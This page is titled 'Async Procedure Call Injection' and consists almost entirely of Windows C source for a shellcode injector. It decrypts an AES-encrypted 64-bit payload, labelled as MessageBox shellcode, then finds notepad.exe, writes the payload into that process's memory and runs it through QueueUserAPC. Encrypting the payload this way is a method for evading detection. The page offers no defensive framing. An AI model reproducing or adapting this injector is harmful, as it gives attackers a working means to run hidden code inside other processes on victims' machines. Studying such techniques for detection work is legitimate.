# Async Procedure Call Injection

<pre class="language-c"><code class="lang-c"><strong>#include &#x3C;winternl.h>
</strong>#include &#x3C;windows.h>
#include &#x3C;stdio.h>
#include &#x3C;stdlib.h>
#include &#x3C;string.h>
#include &#x3C;tlhelp32.h>
#include &#x3C;wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char payload[] = { 0xbe, 0x81, 0x8f, 0x19, 0xb1, 0xb1, 0x24, 0xda, 0x48, 0xba, 0x60, 0x51, 0xed, 0xa9, 0x12, 0x60, 0x25, 0xb1, 0x38, 0x65, 0x55, 0x9b, 0xae, 0x50, 0xc4, 0x07, 0x3a, 0x50, 0x80, 0xee, 0x16, 0xe8, 0xfd, 0x96, 0xd5, 0x1e, 0x3c, 0x13, 0x21, 0x84, 0xce, 0xf0, 0x1d, 0xe5, 0xab, 0x20, 0x24, 0x54, 0x6e, 0xcf, 0xd2, 0x09, 0x2a, 0xa8, 0x40, 0x31, 0xa6, 0xa1, 0x7a, 0x85, 0xae, 0xb1, 0x98, 0x87, 0x71, 0x06, 0xa5, 0xa0, 0x87, 0x71, 0x1c, 0x8c, 0xe5, 0xee, 0xdb, 0xcd, 0xad, 0xf2, 0xdf, 0x62, 0x36, 0xab, 0x8e, 0xe0, 0x4e, 0x5f, 0xff, 0xa4, 0xd0, 0x79, 0x44, 0x41, 0xb2, 0x64, 0xa7, 0x24, 0x36, 0xe3, 0x10, 0x93, 0xdc, 0xd8, 0xea, 0xfd, 0x54, 0x4b, 0xa1, 0x95, 0x30, 0x5d, 0x0d, 0xff, 0x92, 0xd1, 0xc7, 0x0e, 0xb4, 0x96, 0xf5, 0x9f, 0x2d, 0x9a, 0x7c, 0x9c, 0x72, 0xeb, 0x7d, 0xec, 0x87, 0x15, 0x5b, 0xf8, 0x31, 0x3c, 0xa0, 0x81, 0xf6, 0xb8, 0x11, 0xc7, 0x82, 0x44, 0xda, 0xa2, 0xd5, 0x2e, 0xb1, 0x97, 0x74, 0x03, 0x22, 0xaa, 0xfb, 0x23, 0x14, 0xe9, 0x64, 0x77, 0xf9, 0x0c, 0x87, 0xbe, 0x70, 0xf2, 0x04, 0x3d, 0x0d, 0x57, 0xc6, 0xce, 0xbe, 0xc1, 0x79, 0xcb, 0x64, 0x53, 0xc0, 0xa9, 0x85, 0x3e, 0xbe, 0xe2, 0xd0, 0x98, 0x81, 0x56, 0xc8, 0x52, 0x25, 0xf9, 0xb5, 0x79, 0xb6, 0x01, 0xe6, 0xd6, 0x0e, 0x97, 0x2d, 0x74, 0x2f, 0xe1, 0x83, 0x27, 0xdb, 0x6d, 0xa8, 0xe0, 0x72, 0x87, 0xb7, 0x4c, 0x79, 0x9e, 0x28, 0x05, 0xfb, 0x3d, 0x35, 0xd6, 0x0a, 0xcd, 0x49, 0xd2, 0x91, 0xe5, 0x50, 0x8b, 0xe3, 0xd9, 0x3a, 0xd8, 0x3f, 0x48, 0xd0, 0x6c, 0x83, 0xca, 0x6f, 0x19, 0x1f, 0xa1, 0x5f, 0xf8, 0xbc, 0xb3, 0x85, 0x0a, 0xa7, 0x19, 0xc2, 0x66, 0xa8, 0x29, 0xd9, 0x88, 0x18, 0x68, 0x91, 0xd3, 0x94, 0xcb, 0x8a, 0xb0, 0xae, 0x7e, 0x37, 0x47, 0x02, 0x4a, 0x04, 0x81, 0x52, 0x01, 0x3a, 0xee, 0x45, 0xc7, 0xc0, 0x5d, 0x96, 0xce, 0xcb, 0x25, 0x1c, 0x11, 0xfa, 0x1e };
unsigned char key[] = { 0x0b, 0x26, 0xc0, 0x49, 0x14, 0xb4, 0xd5, 0x7d, 0x9a, 0x67, 0xe7, 0xa5, 0xd9, 0xdd, 0xbc, 0x81 };

unsigned int payload_len = sizeof(payload);

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef LPVOID(WINAPI* VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);

typedef VOID(WINAPI* RtlMoveMemory_t)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length);

typedef FARPROC(WINAPI* RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS(NTAPI* NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL);

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);

// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;


int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&#x26;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &#x26;hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &#x26;hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&#x26;payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


int FindTarget(const wchar_t* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
	wchar_t procnameLower[260];
	wchar_t exeNameLower[260];


	wcsncpy_s(procnameLower, 260, procname, _TRUNCATE);
	for (size_t i = 0; procnameLower[i]; i++) {
		procnameLower[i] = towlower(procnameLower[i]);
	}

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &#x26;pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &#x26;pe32)) {
		wcsncpy_s(exeNameLower, 260, pe32.szExeFile, _TRUNCATE);
		for (size_t i = 0; exeNameLower[i]; i++) {
			exeNameLower[i] = towlower(exeNameLower[i]);
		}

		if (wcscmp(procnameLower, exeNameLower) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


HANDLE FindThread(int pid) {

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	while (Thread32Next(Snap, &#x26;thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);

	return hThread;
}


// APC injection
int InjectAPC(int pid, HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	// find a thread in target process
	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}

	// Decrypt and inject payload
	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

	// perform payload injection
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	// execute the payload by adding async procedure call (APC) object to thread's APC queue
	QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);

	return 0;
}


int main(void) {

	int pid = 0;
	HANDLE hProc = NULL;

	pid = FindTarget(L"notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD)pid);

		if (hProc != NULL) {
			InjectAPC(pid, hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}

</code></pre>
